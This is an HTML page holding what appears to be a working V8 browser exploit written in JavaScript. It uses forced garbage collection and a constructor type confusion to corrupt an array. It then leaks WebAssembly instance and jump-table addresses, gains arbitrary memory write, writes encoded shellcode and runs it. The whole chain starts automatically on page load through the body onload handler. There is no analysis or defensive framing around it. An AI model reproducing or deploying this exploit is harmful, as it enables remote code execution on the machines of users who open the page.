<html>
<head>
<script>
var addrOf_LO = new Array(1048577);
// var addrOf_LO = new Array(0x3000);

var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x09, 0x02, 0x60,  0x00, 0x00, 0x60, 0x02, 0x7f, 0x7e, 0x00, 0x03, 0x05, 0x04, 0x00, 0x00,  0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x22, 0x04, 0x03, 0x6e,  0x6f, 0x70, 0x00, 0x00, 0x04, 0x6e, 0x6f, 0x70, 0x32, 0x00, 0x01, 0x09,  0x61, 0x72, 0x62, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x02, 0x05,  0x73, 0x68, 0x65, 0x6c, 0x6c, 0x00, 0x03, 0x0a, 0x29, 0x04, 0x03, 0x00,  0x01, 0x0b, 0x15, 0x00, 0x01, 0x41, 0x00, 0x41, 0xad, 0xbd, 0x03, 0x36,  0x02, 0x00, 0x41, 0x01, 0x41, 0xad, 0xbd, 0x03, 0x36, 0x02, 0x00, 0x0b,  0x09, 0x00, 0x20, 0x00, 0x20, 0x01, 0x37, 0x03, 0x00, 0x0b, 0x03, 0x00,  0x01, 0x0b
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var { shell, arb_write, nop, nop2 } = wasm_instance.exports;

for(var i = 0;i< 0x30;i++)addrOf_LO[i]= 0x12121212;

class C2 {
}
var corrupted_arr = [1.1];
var gcSize = 0x7fe00000;
function gc_scavenge() {
    var a = [];
    for (var i = 0; i < 100000; i++) { a[i] = new String(""); }

}
function gc_major() { //mark-sweep
                new ArrayBuffer(0x4fe00000);
            }

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
        this.roots = new Array(0x30000);
        this.index = 0;

    }
  
    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    print_hex(f){
        console.log('0x' + this.f64toi64(f).toString(16));
    }
    hex_to_dbl(hexString) {
        if (hexString.startsWith('0x')) {
            hexString = hexString.substring(2);
        }
    
    
        for (let i = 0; i < 8; i++) {
            const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
            this.u8[i] = parseInt(byte, 16);
        }
    
        const float64 = new Float64Array(this.u8.buffer);
        return float64[0];
    }
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}



var helper = new Helpers();
let global_fa ;
class C3 extends C2 {
    constructor(obj) {
        try { new.target(); } catch (e) {}
        super();
        const v12 = new Array(32);
        const v14 = new Array(64);
        // %DebugPrint(v12);
            for (let v13 = 0; v13 < 2; v13++) {
                if(!v13) {
                 
    
                    gc_scavenge();
                    gc_major();
                  
                    let fake_object_array = [helper.hex_to_dbl("0x4E424242"),helper.hex_to_dbl("0x4F424242"), helper.hex_to_dbl("0x4A4E4242"),helper.hex_to_dbl("0x4C4C4242"),helper.hex_to_dbl("0x43424242"),helper.hex_to_dbl("0x44424242"),helper.hex_to_dbl("0x45424242"),helper.hex_to_dbl("0x4a424442"),helper.hex_to_dbl("0x4a454242"),helper.hex_to_dbl("0x4a464242"),helper.hex_to_dbl("0x4a474242"),helper.hex_to_dbl("0x4a484242"),helper.hex_to_dbl("0x4a494242"),helper.hex_to_dbl("0x4a404242"),helper.hex_to_dbl("0x4a424242"),helper.hex_to_dbl("0x48424242"),helper.hex_to_dbl("0x49424242"),helper.hex_to_dbl("0x49424242"),helper.hex_to_dbl("0x6a5000971a1"),helper.hex_to_dbl("0x30000000242004")];// 0x6a5000571a1
                    global_fa = fake_object_array;

                } 
                else{
                    obj.c = v12;
                    obj.e = corrupted_arr; 
                    obj.d = v14 ;
                }

            }
    }
}
function sleep(miliseconds) {
   var currentTime = new Date().getTime();
   while (currentTime + miliseconds >= new Date().getTime()) {
   }
}


let index = 0x30;
while(index < 0x100){
    addrOf_LO[index+1] = wasm_instance;
    addrOf_LO[index+2] = wasm_instance;
    addrOf_LO[index+3] = wasm_instance;
    addrOf_LO[index+0] = wasm_instance;
    index += 4;
}
function convertTo64BitIntegersLittleEndian(byteArray) {
    const result = [];
    
    // Function to convert a chunk of 8 bytes to a 64-bit integer in little-endian format
    function bytesTo64BitIntegerLE(chunk) {
        let value = BigInt(0);
        chunk.forEach((byte, index) => {
            value += BigInt(byte) << (BigInt(index) * BigInt(8));
        });
        return value;
    }

    for (let i = 0; i < byteArray.length; i += 8) {
        const chunk = byteArray.slice(i, i + 8);
        result.push(bytesTo64BitIntegerLE(chunk));
    }

    return result;
}
function pwn(){
    console.log('begin');
    let obj = {a: [], c: "a" };
    nop();
    nop2();
    arb_write(0, 10n);
    shell();
    // sleep(3000);
    new C3(obj);
    // %DebugPrint(obj);
    // %DebugPrint(obj.c);
    // %DebugPrint(obj.d);
    // %DebugPrint(obj.e);

    for(var i = 0;i < 300;i++ ) {
        console.log(i);
        new C3(obj);
        if(i > 200) {
                //    %DebugPrint(obj.e);
                //    %DebugPrint(obj.d);
                //    %DebugPrint(obj.c);
                    console.log(typeof(obj.d.length));
                   if(obj.d.length != 64){
                        // %DebugPrint(obj);
                        console.log('break done');
                        break;
                   }
        }
    }
    console.log('hello '); 
    // new C3(obj);
    //  %DebugPrint(obj.e);
    //  %DebugPrint(obj.d);
    //  %DebugPrint(addrOf_LO);
    //  %DebugPrint(wasm_instance);
    //  %DebugPrint(obj);
     let leak_addr = [];
    let begin_scan = 0;
    let found = 0;
    // console.log(obj.d[113]);
    // helper.trap();
    for(let i = begin_scan;i < begin_scan+0x5020;i++){
        // console.log("scanning " + i );
        helper.print_hex(obj.d[i]);
        // if(i > 12580 && i < 12600) %DebugPrint(obj.d[i]);
        if(obj.d[i] === helper.hex_to_dbl("0x2424242424242424")){
                console.log("[*] Found the pilot at: " + i + " 0x");
                helper.print_hex(obj.d[i]);
                // %DebugPrint(obj.d[i]);
                found = i;
                break;
        }

    }
    for(let i = found; i < found + 0x60;i++){
    if(obj.d[i]!= helper.hex_to_dbl("0x2424242424242424")) leak_addr.push(obj.d[i]); 
    // console.log(i + " 0x" + doubleToHex(obj.d[i]));

    }
    // console.log(leak_addr);
    helper.print_hex(leak_addr[0]);
    helper.print_hex(leak_addr[1]);
    helper.print_hex(leak_addr[2]);
    helper.print_hex(leak_addr[3]);
    helper.print_hex(leak_addr[4]);
    helper.print_hex(leak_addr[5]);
    helper.print_hex(leak_addr[6]);
    let addr_off = leak_addr[1];
    let  corrupted_arr_off = helper.ftoih(addr_off)
    let  wasm_instance_off = helper.ftoil(addr_off) 
    let was_instance_off_correct = (wasm_instance_off>>8) & 0xffffff;
    let wasm_instance_addr = BigInt(was_instance_off_correct);
    // console.log("[*] Address of wasm instance "  + wasm_instance_addr.toString(16)); 
    
    global_fa[19] = helper.pair_i32_to_f64(was_instance_off_correct - 1,0x300000) ; 
    helper.print_hex(global_fa[19]);
    for(let i = 0;i < 32;i++) helper.print_hex(obj.d[i]); 
    let jump_table_start = BigInt(helper.f64toi64(obj.d[8])) >> 8n; 
    let tiering_budget_array_off_addr = BigInt(helper.f64toi64(obj.d[14])) >> 8n; 
    console.log("[*] Found jump_table_start 0x"+jump_table_start.toString(16));
    console.log("[*} Found tiering_budget_array_off_addr 0x" + tiering_budget_array_off_addr.toString(16));


    let shr_instruction_off = 0xca0n;

    let sub_instruction_off = 0xc3an + 4n;

    let add_instruction_off = 0xca4n; 

    let js_instruction_off = 0xc3bn;
    let shellcode_off = 0xd04n;


    let shr_instruction_addr = jump_table_start + shr_instruction_off;
    let sub_instruction_addr = jump_table_start + sub_instruction_off ; // nop1
    let add_instruction_addr = jump_table_start + add_instruction_off;
    let js_instruction_addr = jump_table_start + js_instruction_off;
    let shellcode_addr = jump_table_start + shellcode_off;

    obj.d[14] = helper.i64tof64(sub_instruction_addr << 8n);



    nop(); 
    nop(); 


    obj.d[14] = helper.i64tof64(((js_instruction_addr+1n)<<8n));
    nop2(); 

    obj.d[14] = helper.i64tof64(((shr_instruction_addr-4n+3n)<<8n));
    for (let _ = 0; _ < 6; _++) {
        nop2(); 
    }
    obj.d[14] = helper.i64tof64(((add_instruction_addr-4n)<<8n));
    nop2(); 
    obj.d[14] = helper.i64tof64((tiering_budget_array_off_addr<<8n));
    obj.d[14-9] = 0; 
    obj.d[14-10] = 0; 
    obj.d[14-11] = 0; 
    obj.d[14-10] = helper.i64tof64((shellcode_addr<<8n));
    const shellcode = [
        72451633271836816n, 5188429349533267073n, 7363217583902175160n, 16683945837405556844n, 18446667387153413681n, 6352444675345383423n, 5564555788650n
    ];
    shellcode.map((code, i) => {
            arb_write(i * 8, code);
        })
        
        console.log("[+] spwn shell!!!")
        sleep(3000);
        shell(); 
    }

</script>
</head>
<body onload="pwn()">
</body>
</html>
